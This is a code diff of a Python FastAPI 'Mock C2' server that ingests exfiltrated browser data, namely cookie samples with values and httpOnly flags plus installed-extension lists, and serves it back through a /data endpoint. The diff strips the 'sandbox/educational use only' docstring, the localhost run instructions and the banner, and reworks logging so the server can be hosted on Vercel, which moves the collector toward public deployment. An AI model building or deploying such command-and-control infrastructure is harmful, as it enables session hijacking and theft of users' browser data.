@@ -1,22 +1,12 @@
-#!/usr/bin/env python3
-"""
-MOCK C2 server — sandbox/educational use only.
-Listens on http://localhost:8787, logs all ingest POSTs to ./log.ndjson
-and prints a colourised console summary.
-
-Install: pip install fastapi uvicorn
-Run:     uvicorn server:app --host 127.0.0.1 --port 8787 --reload
-"""
-
 import json
-import os
 import datetime
-from pathlib import Path
+import logging
 from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 
-LOG_FILE = Path(__file__).parent / "log.ndjson"
+# Configure Vercel-compatible logging
+logging.basicConfig(level=logging.INFO, format='%(message)s')
 
 app = FastAPI(title="Mock C2", docs_url="/docs")
 
@@ -28,7 +18,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ── Console colours ───────────────────────────────────────────────────────
+# ── Console colours (Will show in Vercel Logs) ────────────────────────────
 RESET = "\033[0m"
 RED   = "\033[91m"
 YELLOW= "\033[93m"
@@ -58,10 +48,7 @@ def summarise(kind: str, payload: dict | list) -> str:
         lines.append(f"  total in profile : {payload.get('total', '?')}")
         lines.append(f"  interesting hits : {payload.get('hits', '?')}")
         for c in payload.get("sample", [])[:5]:
-            lines.append(
-                f"    [{c['domain']}] {c['name']} = {c['value_preview']}"
-                f"  (httpOnly={c['httpOnly']})"
-            )
+            lines.append(f"    [{c['domain']}] {c['name']} = {c['value_preview']}  (httpOnly={c['httpOnly']})")
     elif kind == "extensions" and isinstance(payload, list):
         lines.append(f"  installed count  : {len(payload)}")
         for e in payload[:8]:
@@ -97,9 +84,8 @@ def summarise(kind: str, payload: dict | list) -> str:
     return "\n".join(lines)
 
 
-# ── In-memory store so /data endpoint can serve the popup ─────────────────
+# ── In-memory store (WARNING: Will reset frequently on Vercel) ────────────
 captured: list[dict] = []
-
 
 @app.post("/ingest")
 async def ingest(request: Request):
@@ -108,9 +94,8 @@ async def ingest(request: Request):
     except Exception:
         return JSONResponse({"ok": False, "error": "invalid JSON"}, status_code=400)
 
-    # Persist to NDJSON log
-    with LOG_FILE.open("a") as f:
-        f.write(json.dumps(obj, ensure_ascii=False) + "\n")
+    # Instead of logging to a file, log the raw JSON to Vercel's system logs
+    logging.info(f"RAW_PAYLOAD: {json.dumps(obj, ensure_ascii=False)}")
 
     captured.append(obj)
 
@@ -121,13 +106,13 @@ async def ingest(request: Request):
     ts      = datetime.datetime.fromtimestamp(ts_raw / 1000).strftime("%H:%M:%S")
     color   = KIND_COLOR.get(kind, CYAN)
 
-    print(f"\n{color}{BOLD}[{ts}] RECV kind={kind}  run={run_id}{RESET}")
+    # Log the summary format to Vercel
+    logging.info(f"\n{color}{BOLD}[{ts}] RECV kind={kind}  run={run_id}{RESET}")
     summary = summarise(kind, payload)
     if summary:
-        print(summary)
+        logging.info(summary)
 
     return {"ok": True}
-
 
 @app.get("/data")
 async def get_data(kind: str | None = None):
@@ -136,24 +121,12 @@ async def get_data(kind: str | None = None):
         return [e for e in captured if e.get("kind") == kind]
     return captured
 
-
 @app.delete("/data")
 async def clear_data():
-    """Clear in-memory capture list (does not touch log.ndjson)."""
+    """Clear in-memory capture list."""
     captured.clear()
     return {"ok": True, "cleared": True}
-
 
 @app.get("/health")
 async def health():
     return {"status": "ok", "captured": len(captured)}
-
-
-# ── Startup banner ────────────────────────────────────────────────────────
-@app.on_event("startup")
-async def banner():
-    print(f"\n{GREEN}{BOLD}MOCK C2 server — sandbox/educational only{RESET}")
-    print(f"Listening on  http://127.0.0.1:8787")
-    print(f"API docs      http://127.0.0.1:8787/docs")
-    print(f"Captured data http://127.0.0.1:8787/data")
-    print(f"Log file      {LOG_FILE}\n")
